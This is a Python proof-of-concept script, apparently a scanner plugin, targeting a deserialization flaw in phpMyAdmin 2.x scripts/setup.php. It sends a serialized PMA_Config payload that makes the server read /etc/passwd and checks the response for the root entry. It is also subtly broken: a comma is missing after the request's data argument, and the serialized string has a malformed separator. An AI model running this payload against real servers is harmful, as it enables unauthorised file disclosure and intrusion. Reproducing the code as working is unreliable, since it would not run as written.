#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "phpmyadmin scripts/setup.php 反序列化漏洞",
        "desc": "phpmyadmin 2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。",
        "grade": "中",
        "type": "web",
        "keyword": "tag:phpmyadmin"
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    try:
        r = requests.post(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/scripts/setup.php',
            data="action=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\",s:11:\"/etc/passwd\";}"
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if r.status_code == 200 and "root:x:0:0" in r.text:
            return True
        else:
            return False
    except Exception:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

